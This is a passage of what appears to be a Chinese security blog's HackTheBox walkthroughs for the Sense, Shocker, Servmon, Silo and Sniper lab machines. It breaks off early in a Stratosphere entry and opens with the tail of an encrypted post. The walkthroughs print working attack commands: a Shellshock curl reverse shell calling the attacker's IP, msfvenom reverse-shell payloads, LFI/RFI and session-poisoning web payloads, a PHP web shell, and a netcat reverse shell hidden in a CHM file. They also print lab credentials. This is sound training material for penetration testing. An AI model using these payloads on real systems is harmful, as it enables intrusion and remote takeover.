f9d574a31a0682af5f51a06e5eba7082a024bbcfa2d53ac0cc6e4b20a8bb07005849edd7803a0bae7cbc5aed8e98f7dff58f9e12f718351610ae7d8b6041c6a01cc87f2c0ff2b36d71a0d3fbcd12830b13d037b72888f71b7a68ca17f563ec2839fccb9aa381a54f670d76d8fd0f0cfc3ae3328ed84043c3ca63f7a6821b71e3d7e82d69a996d768c098358308302e49b6d4dbcd8f2cca24e676c1e15e88fb346514222b176441ea91d318227cf318666f1cf5a3fb09303fda9d7f78cd6e7eadf9b64aa572c180c53feab49f52130fa307eaf028cf7660e8933ce0b89b24934a8f8ea7ad136dd2f2f493b0f0653504deb021ad5165957b2a1de7d01bfcdd8d0cfdd505d93545a7bd853bc3d49d30d39d731de5c590e96d919473870a22520351086228312bbd84f1592fdfefac18d14c97f9732a80f934ae002f774eccee78644facb880bab38b3f2be9238ed48cab7235d8582bbd0916a571aae12a27c1ab0cece6619b664b34dcd8cc39e46696a52b43f712a587a86ea4b9bd92cdc38f642e9c49490182969b1d59c660a4a28c71a723380b141dc3f2f4cf189877f401e966bfe262d9358bc988ea83d726c97673687d63fe7a5954a182aaaeb8f5fc7e0068f669573a41ffa165f985dc1eeb3561dda1ffeea5ae098035181ae0317f65d9aae9e293c43c609f907f61fda301c77e38b8cf52a49d5c05c12e81d4c556c1eba3a2b2261496843e3a6062675efa7b728614a723beb82ba8c61600c23e0c552437346e2204b6cd9660d25902bc384e67b67debf1b4aa3d72cf6e957ebfdeaa9992ebf843c4728bc7e3c60c5a2a1ad2938cbb8cd499106459435f530932dd78b34d8f920006d2a63a4d082c4d4134b15c2de54259c2eeab0a22928af2ec7dfb5fe36b582b84be8315db3bf9f3709f5c9cca9bcacb4a405beccf6180713ba2e9ee48c9564239a02bb5839bd4400244824144177d7c212d1270ca6d0db6e54ae98329fc4ef9cf944ebca1fefc1eb02daccfa3243629f698b4ca7854103ca0e8e1b8c9b605b35ed677df280c827f9650a5f27ed0dfdd1b1666abaa03b1b593ba4e91910845e2b6b546cfb27a7903d100c4c8359c41842f923b32aecbc9c8ae1b0394029b1c2ac9f25b95623ddd3d0ee9eaccf9bbd2485cfb9a1047d8caf0d4a08f71f34605e36fff518c74a505e9cba3063dcd0fb9a9ce6e05a988c8f3bfaf27b2cd8a4f292675902533163b90594f428f17728a8a8beda6a9703cd4346edaf43a60e8661e5e5879d96456b46a5936eb4a4a79f768674352d09386f2b9bda2db19b19fcb6dc89a82b8765520fc409fd2824f74f10bbd4cb7c473de29f733b576805097067b02b0dbb329bd1cef23da8d581ffc77635c44eaf6351e70d5c3a73ea6977cde40aee461b90890af00549eb9f5e6d3ca176c14ea8c9b52695290465339fe263a57932fa0b3fb10296f7f53f93c9303600b21936d390c6f56cdb562e3b9a5f13a000b4949bb0a8f3ec890ac9e79306a3dbb276698b43fbf7afaf9b15a74293651579368103c5353bd3e230722339dbed51f99e0a5b32c3b040ca76fd30276e0816cb915ff0083f75bca208443cf13ca2e5d79175c5b97a73b4403565d493efe52fb563348c347b660fd5681cb799a147bcd0a706e2718878d427940f901400f48f3eaccf4f995d4875b04d2a76c0b2bcfbce032817b11e58920cc6c860b8d531c08d2a003319538d75f229d799aaf8f09b9ddc64d3a9111c8020e9b772f06c3d1535f7024355f8235856029e6882acb99f05dd9b33611f662d9fd6d53e0bd7a0eab2a31e496ed9ddb1c945c71efd04ae8cdea35b1f0191ae80823b548837411764030e4250fceb273aace4d2463e9275d5bb1bad5c8ef9d29e1a1dad0a345ac</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">尚未退休root hash($6...V0)</span>
      </label>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sense</title>
    <url>/2020/06/18/HTB-Sense/</url>
    <content><![CDATA[<h1 id="Sense"><a href="#Sense" class="headerlink" title="Sense"></a>Sense</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Sense/1.jpg" alt="1"></p>
<p>HTTP和HTTPS两个web服务<br>并且http会重定向到https</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Sense/2.jpg" alt="2"></p>
<p>网站主页存在登录会话，其他没任何发现<br>进行目录枚举</p>
<p><img src="/images/Sense/3.jpg" alt="3"></p>
<p>发现了了两个有意思的文件</p>
<p>首先是changelog.txt</p>
<p><img src="/images/Sense/4.jpg" alt="4"></p>
<p>提示网页是存在漏洞的<br>另一个是system-users.txt<br><img src="/images/Sense/5.jpg" alt="5"></p>
<p>直接找到了用户的账号和密码，不过密码提示是默认密码</p>
<p>Google一下就可以找到，密码为pfsense，账号为rohit(小写)</p>
<p><img src="/images/Sense/6.jpg" alt="6"></p>
<p>登录之后，还可以得到版本 2.1.3</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p><img src="/images/Sense/7.jpg" alt="7"></p>
<p>寻找到了公开漏洞，发现是一个python3脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 43560.py --rhost 10.10.10.60 --lhost 10.10.16.173 --lport 4444 --username rohit --password pfsense</span><br></pre></td></tr></table></figure>

<p>直接利用即可</p>
<p><img src="/images/Sense/8.jpg" alt="8"></p>
<p>直接获取了root</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Shocker</title>
    <url>/2020/06/06/HTB-Shocker/</url>
    <content><![CDATA[<h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Shocker/1.jpg" alt="1"></p>
<p>只发现了SSH和HTTP服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问80端口</p>
<p><img src="/images/Shocker/2.jpg" alt="2"></p>
<p>主页面上什么都没有<br>进行目录枚举</p>
<p><img src="/images/Shocker/3.jpg" alt="3"></p>
<p>发现了目录cgi-bin<br>对其进行文件枚举</p>
<p><img src="/images/Shocker/4.jpg" alt="4"></p>
<p>在这其中我发现一个文件</p>
<p><img src="/images/Shocker/5.jpg" alt="5"></p>
<p>下载后进行查看</p>
<p><img src="/images/Shocker/6.jpg" alt="6"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>google搜索<code>cgi-bin exploit</code>，发现了一个名为shellshock的漏洞</p>
<p>漏洞介绍</p>
<blockquote>
<p>Apache有一个mod_cgi模块，专门用来处理CGI脚本的执行。<br>CGI是一种协议，旨在允许web服务器直接执行服务器中类似控制台程序，这些程序也就是CGI脚本，通常用来处理来自动态网页的数据并通过HTTP进行交互。<br>必须指定一个新目录，通常是cgi-bin或者类似的名字，以使CGI脚本能够运行。当浏览器请求CGI目录中包含的特定文件的URL时，服务器运行该脚本，并将输出传递回浏览器。<br>运行CGI脚本时，会将特定信息复制到环境变量中。如果被调用，该信息将随后传递给Bash，从而为攻击者提供了一种注入恶意代码的方法。</p>
</blockquote>
<h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h3><p>先进行扫描，确认漏洞存在</p>
<p><img src="/images/Shocker/7.jpg" alt="7"></p>
<p>扫描后发现，id命令执行成功，需要特别注意的是<code>TARGETURI</code>指向脚本地址</p>
<p><img src="/images/Shocker/8.jpg" alt="8"></p>
<p>之后成功getshell</p>
<h3 id="不使用msf"><a href="#不使用msf" class="headerlink" title="不使用msf"></a>不使用msf</h3><p>POC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -H &#39;User-Agent: () &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.132&#x2F;4444 0&gt;&amp;1&#39; http:&#x2F;&#x2F;10.10.10.56&#x2F;cgi-bin&#x2F;user.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Shocker/9.jpg" alt="9"></p>
<p>另外，searchsploit里<code>34900.py</code>也可以使用</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Shocker/10.jpg" alt="10"></p>
<p>发现perl可以以root执行，直接进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br></pre></td></tr></table></figure>

<h3 id="升级交互式shell"><a href="#升级交互式shell" class="headerlink" title="升级交互式shell"></a>升级交互式shell</h3><p>该机器上装有python3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Shocker/11.jpg" alt="11"></p>
<p>获取flag</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Servmon</title>
    <url>/2020/10/28/HTB-Servmon/</url>
    <content><![CDATA[<h1 id="Servmon"><a href="#Servmon" class="headerlink" title="Servmon"></a>Servmon</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Servmon/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21端口ftp允许匿名登录，下载所有文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget --mirror --no-passive-ftp &#39;ftp:&#x2F;&#x2F;anonymous:anonymous@10.10.10.184&#39;</span><br></pre></td></tr></table></figure>

<p>提示Nathan的桌面有密码文件</p>
<p><img src="/images/Servmon/2.png" alt="2"></p>
<p>网站有一些没有配置的东西</p>
<p><img src="/images/Servmon/3.png" alt="3"></p>
<p>80端口发现</p>
<p><img src="/images/Servmon/4.png" alt="4"></p>
<p>8443发现NSClient++，好像是一个监控系统</p>
<p><img src="/images/Servmon/9.png" alt="9"></p>
<p>而且提示了找回密码的方法</p>
<p><img src="/images/Servmon/10.png" alt="10"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>寻找公开漏洞</p>
<p><img src="/images/Servmon/5.png" alt="5"></p>
<p>得到目录遍历，可以利用它查看任何文件</p>
<p><img src="/images/Servmon/6.png" alt="6"></p>
<p>现在尝试读取21端口提示的密码</p>
<p><img src="/images/Servmon/7.png" alt="7"></p>
<p>得到了一些凭证，现在尝试登录</p>
<p>这台windows比较特殊，存在SSH服务，可以利用hydra或者msf进行ssh爆破，得到凭证<code>nadine/L1k3B1gBut7s@W0rk</code></p>
<p>和windows的特性一样，ssh用户名不区分大小写</p>
<p><img src="/images/Servmon/8.png" alt="8"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>之前有一个方法可以找回密码，直接去寻找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;A&#x2F;S nscp.exe</span><br></pre></td></tr></table></figure>

<p>得到位置</p>
<p><img src="/images/Servmon/11.png" alt="11"></p>
<p>执行之前的命令，找回密码</p>
<p><img src="/images/Servmon/12.png" alt="12"></p>
<p>尝试登录，但仍然失败</p>
<p><img src="/images/Servmon/13.png" alt="13"></p>
<p>去查看配置文件，通常是.ini结尾</p>
<p><img src="/images/Servmon/14.png" alt="14"></p>
<p>发现了密码，发现了IP白名单，只允许本地登录，我们可以在kali上，进行本地端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184</span><br></pre></td></tr></table></figure>

<p>端口开发，访问打不开</p>
<p><img src="/images/Servmon/15.png" alt="15"></p>
<p>使用https，成功登录</p>
<p><img src="/images/Servmon/16.png" alt="16"></p>
<p>之后提权参考46802.txt，不过各种工具都被AV干掉了，如果没执行就等一等，或者查看modules组件情况，再点一下queries看看</p>
<p>太晚了，后面有空再作免杀吧，只好先读个flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type C:\Users\Administrator\Desktop\root.txt &gt; C:\Temp\flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Servmon/17.png" alt="17"></p>
<p>这机子被改过了，别人NC一波结束，我免杀了半个小时没过defender，哎。</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Silo</title>
    <url>/2020/06/19/HTB-Silo/</url>
    <content><![CDATA[<h1 id="Silo"><a href="#Silo" class="headerlink" title="Silo"></a>Silo</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Silo/1.jpg" alt="1"></p>
<p>扫描出了大量端口，比如HTTP、SMB、Oracle</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>进行http目录扫描，不过没扫出有价值的信息，大部分都是403</p>
<p>smb进行匿名访问 ，发现不可以访问，再使用nmap vuln扫描，没发现可以利用的漏洞</p>
<p>只能对oracle进行枚举了，使用工具<a href="https://github.com/quentinhardy/odat">ODAT</a>(oracle database attacking tool)<br>直接使用apt安装即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat -h			&#x2F;&#x2F;先查看可以使用的模块</span><br><span class="line">odat [module] -h	&#x2F;&#x2F;再查看模块的参数，之后填写使用即可</span><br></pre></td></tr></table></figure>

<p>首先枚举用户ID(SID)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat sidguesser -s 10.10.10.82 -p 1521</span><br></pre></td></tr></table></figure>

<p>默认使用字典<code>sids.txt</code></p>
<p><img src="/images/Silo/2.jpg" alt="2"></p>
<p>枚举出了用户XE和XEXDB</p>
<p>之后进行账户密码枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat passwordguesser -s 10.10.10.82 -p 1521 -d XE</span><br></pre></td></tr></table></figure>

<p>默认使用字典<code>accounts.txt</code><br>我第一次枚举什么也没枚举出来，经检查，是字典的问题，全部都是大写<br>可以使用mousepad→选中全部内容→Edit→Convert→To Lowercase<br>之后使用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file &#x2F;root&#x2F;Desktop&#x2F;accounts.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/3.jpg" alt="3"></p>
<p>这次我们获取了账号密码<br>scott/tiger</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>生成木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp lhost&#x3D;10.10.16.150 lport&#x3D;4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure>

<p>上传<br>注意remotepath填写c:/而不是c:\</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat utlfile -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --putFile c:&#x2F; evil.exe &#x2F;root&#x2F;Desktop&#x2F;evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/4.jpg" alt="4"></p>
<p>执行木马获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odat externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --sysdba --exec c:&#x2F; evil.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Silo/5.jpg" alt="5"></p>
<p>之后获取了system shell</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Sniper</title>
    <url>/2021/06/05/HTB-Sniper/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Sniper/1.png" alt="1"></p>
<p>目标机器运行着IIS，尝试枚举首页扩展名，发现是<code>php</code></p>
<p><img src="/images/Sniper/2.png" alt="2"></p>
<p>Web枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http:&#x2F;&#x2F;10.10.10.151&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dir.txt -n -x php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/3.png" alt="3"></p>
<p>发现一个登陆页面<code>/user/login.php</code></p>
<p><img src="/images/Sniper/4.png" alt="4"></p>
<p>这里可以注册账户</p>
<p><img src="/images/Sniper/5.png" alt="5"></p>
<p>登陆，似乎是个正在开发的页面</p>
<p><img src="/images/Sniper/6.png" alt="6"></p>
<p>尝试访问<code>/blog/</code></p>
<p><img src="/images/Sniper/7.png" alt="7"></p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这个页面存在<code>Language</code>参数传递<code>FILENAME.php</code>的情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.151&#x2F;blog?lang&#x3D;blog-en.php</span><br><span class="line">http:&#x2F;&#x2F;10.10.10.151&#x2F;blog?lang&#x3D;blog-es.php</span><br><span class="line">http:&#x2F;&#x2F;10.10.10.151&#x2F;blog?lang&#x3D;blog-fr.php</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/8.png" alt="8"></p>
<p>考虑文件包含漏洞，尝试<code>http://10.10.10.151/blog/?lang=/Windows/System32/license.rtf</code></p>
<p><img src="/images/Sniper/9.png" alt="9"></p>
<p>可以确认漏洞存在，尝试<code>http://10.10.10.151/blog/?lang=php://filter/read=convert.base64-encode/resource=blog-en.php</code></p>
<p><img src="/images/Sniper/10.png" alt="10"></p>
<h2 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h2><p>尝试RFI:<code>http://10.10.10.151/blog/?lang=http://10.10.16.12/shell.php</code>，失败没有收到请求</p>
<p>根据之前的php base64修饰器来看，服务器似乎不喜欢某些符号，尝试包含本机smb上的文件，payload:<code>http://10.10.10.151/blog/?lang=\\10.10.16.12\shell.php</code>，成功收到请求</p>
<p><img src="/images/Sniper/11.png" alt="11"></p>
<p>尝试命令执行，编辑<code>shell.php</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system($_REQUEST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过<code>smbserver.py</code>开启smb服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbserver.py -smb2support share .</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/12.png" alt="12"></p>
<p>看来是身份验证出现了问题，尝试Linux上的smb服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;samba&#x2F;smb.conf </span><br></pre></td></tr></table></figure>

<p>添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[share]</span><br><span class="line">   comment &#x3D; Simple Share Directory</span><br><span class="line">   path &#x3D; &#x2F;tmp</span><br><span class="line">   browseable &#x3D; yes</span><br><span class="line">   writable &#x3D; yes</span><br><span class="line">   guest ok &#x3D; yes</span><br><span class="line">   create mask &#x3D; 0777</span><br></pre></td></tr></table></figure>

<p>开启服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start smbd.service</span><br></pre></td></tr></table></figure>

<p>把文件放到指定目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv shell.php &#x2F;tmp&#x2F;shell.php</span><br></pre></td></tr></table></figure>

<p>重新发包，得到RCE</p>
<p><img src="/images/Sniper/13.png" alt="13"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>使用<code>Nishang</code>的<code>Invoke-PowerShellTcp.ps1</code>反弹shell，不过似乎无法收到相应</p>
<p><img src="/images/Sniper/14.png" alt="14"></p>
<p>由于中间件<code>IIS 10</code>，所以应该是Windows Server 2019左右的版本，不知道powershell出了什么其他问题，尝试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell wget 10.10.16.12&#x2F;blabla</span><br></pre></td></tr></table></figure>

<p>成功收到请求</p>
<p><img src="/images/Sniper/15.png" alt="15"></p>
<p>看来Powershell存在某些限制，考虑<code>Constrained Language Mode</code>，尝试枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell $ExecutionContext.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/16.png" alt="16"></p>
<p>果然，当前处于CLM，这就会有很多<code>Cmdlets</code>无法运行</p>
<p>我决定使用<code>netcat</code>反弹shell，但我不想下载文件到对方磁盘，所以我将<code>netcat</code>顺手放在smb里(注意<code>nc.exe</code>的权限)</p>
<p><img src="/images/Sniper/17.png" alt="17"></p>
<h2 id="LFI-Session-Poisoning"><a href="#LFI-Session-Poisoning" class="headerlink" title="LFI+Session Poisoning"></a>LFI+Session Poisoning</h2><p>在HackTheBox的Academy里学习过LFI配合Session投毒的攻击，这里是最佳实践的机会</p>
<p>之前的<code>/user/</code>界面可以注册用户，随便注册一个账户，之后记得一定要<strong>登陆</strong>，这会在服务端产生一个session去追踪会话</p>
<p>利用LFI读取session文件，Windows的session默认保存在<code>C:\Windows\Temp</code>，文件名默认为<code>sess_SESSIONNAME</code>，登陆后在浏览器里查看session</p>
<p><img src="/images/Sniper/18.png" alt="18"></p>
<p>利用LFI读取session，payload:<code>http://10.10.10.151/blog/?lang=/windows/temp/sess_297t6jos594adbsiokk94ug39o</code></p>
<p><img src="/images/Sniper/19.png" alt="19"></p>
<p>成功读取，这表示如果我们的用户名为PHP代码，就可以利用LFI得到RCE</p>
<p>尝试注册用户<code>&lt;?php system(&#39;whoami&#39;); ?&gt;</code>，注册似乎是成功了，但登陆的时候显示</p>
<p><img src="/images/Sniper/20.png" alt="20"></p>
<p>这也在预期内，一般注册不会给用户名键入这么多特殊符号，尝试找出坏字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url_login&#x3D;&quot;http:&#x2F;&#x2F;10.10.10.151&#x2F;user&#x2F;login.php&quot;</span><br><span class="line">url_reg&#x3D;&quot;http:&#x2F;&#x2F;10.10.10.151&#x2F;user&#x2F;registration.php&quot;</span><br><span class="line"></span><br><span class="line">charaters&#x3D;string.punctuation  #所有的标点字符</span><br><span class="line"></span><br><span class="line">for char in charaters:</span><br><span class="line">    mail_addr&#x3D;random.randint(1,999999999999)</span><br><span class="line">    data&#x3D;&#123;&#39;email&#39;:f&quot;&#123;mail_addr&#125;@qq.com&quot;,&#39;username&#39;:f&quot;admin&#123;char&#125;&quot;,&quot;password&quot;:&quot;p@ssw0rd&quot;,&quot;submit&quot;:&quot;&quot;&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url_reg,data&#x3D;data)</span><br><span class="line">    data&#x3D;&#123;&#39;username&#39;:f&quot;admin&#123;char&#125;&quot;,&quot;password&quot;:&quot;p@ssw0rd&quot;&#125;</span><br><span class="line">    r&#x3D;requests.post(url&#x3D;url_login,data&#x3D;data)</span><br><span class="line">    if &quot;incorrect&quot; in r.text:</span><br><span class="line">        print(char,end&#x3D;&#39;&#39;,flush&#x3D;True)</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/21.png" alt="21"></p>
<p>知道了这个就可以构造用户名，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo &#96;whoami&#96; ?&gt;</span><br></pre></td></tr></table></figure>

<p>或者有一种CTF中见过:<a href="https://stackoverflow.com/questions/2020445/what-does-mean-in-php">链接</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;&#96;whoami&#96;?&gt;</span><br></pre></td></tr></table></figure>

<p>注册该用户名，然后包含操作和上述一致。之后可以获得RCE</p>
<p><img src="/images/Sniper/22.png" alt="22"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>在Web目录，枚举文件发现数据连接文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\inetpub\wwwroot&gt; gci -recurse |select-object Fullname                         </span><br><span class="line">gci -recurse |select-object Fullname </span><br><span class="line">...</span><br><span class="line">C:\inetpub\wwwroot\user\db.php</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>查看的到数据库连接凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\inetpub\wwwroot&gt; gc C:\inetpub\wwwroot\user\db.php</span><br><span class="line">gc C:\inetpub\wwwroot\user\db.php</span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; Enter your Host, username, password, database below.</span><br><span class="line">&#x2F;&#x2F; I left password empty because i do not set password on localhost.</span><br><span class="line">$con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz&#x2F;B8xQ~2VM&quot;,&quot;sniper&quot;);</span><br><span class="line">&#x2F;&#x2F; Check connection</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>枚举机器上的用户</p>
<p><img src="/images/Sniper/23.png" alt="23"></p>
<p>我们有一个密码，尝试密码复用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;36mEAhz&#x2F;B8xQ~2VM&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;WORKGROUP\chris&#39;, $SecPass)		#或者</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;SNIPER\chris&#39;, $SecPass)</span><br><span class="line">Invoke-Command -ScriptBlock &#123;whoami&#125; -ComputerName LOCALHOST -Credential $cred</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/24.png" alt="24"></p>
<p>反弹shell即可</p>
<p><img src="/images/Sniper/25.png" alt="25"></p>
<h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>在根目录下发现目录<code>Docs</code>，里面发现<code>note.txt</code></p>
<p>该文件提示我们放一个新app的文档在这个目录里</p>
<p><img src="/images/Sniper/27.png" alt="27"></p>
<p>在Download目录下发现instructions.chm</p>
<p><img src="/images/Sniper/26.png" alt="26"></p>
<p><code>.chm</code>是Windows帮助文件(编译后的html文件)，比如我经常查的PHP手册就是这个格式</p>
<p>在Windows将其打开，得到</p>
<p><img src="/images/Sniper/28.png" alt="28"></p>
<p>它希望有人来狙击这个CEO，我们来帮助它，233</p>
<p>根据提示，我们应该是要生成一个恶意CHM文件到<code>Docs</code>里，之后等待CEO读取</p>
<p>为了生成它，我们需要在Widnows上使用<code>Nishang</code>的<code>Out-CHM.ps1</code>，这需要先安装 <code>htmlhelp.exe</code>(网上多得是)，装完之后会生成目录<code>C:\Program Files (x86)\HTML Help Workshop</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Out-CHM -Payload &quot;C:\users\Chris\documents\nc64.exe 10.10.16.12 9001 -e powershell&quot; -HHCPath &quot;C:\Program Files (x86)\HTML Help Workshop&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Sniper/29.png" alt="29"></p>
<p>将<code>netcat</code>传输到对方的机器命令中出现的目录，不要用建立smb连接后的nc，会有问题。最后开启监听，把<code> .chm</code>复制到<code>C:\Docs\</code>目录下即可</p>
<p><img src="/images/Sniper/30.png" alt="30"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Stratosphere</title>
    <url>/2021/06/02/HTB-Stratosphere/</url>
    <content><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><p><img src="/images/Stratosphere/1.png" alt="1"></p>
<p>80和8080存在相同的Web页面</p>
<p><img src="/images/Stratosphere/2.png" alt="2"></p>
<p>访问不存在的页面返回Tomcat 404页面</p>
<p><img src="/images/Stratosphere/3.png" alt="3"></p>
<p>确认存在Tomcat控制台</p>
<p><img src="/images/Stratosphere/4.png" alt="4"></p>
<p>web目录枚举</p>
<p><img src="/images/Stratosphere/5.png" alt="5"></p>
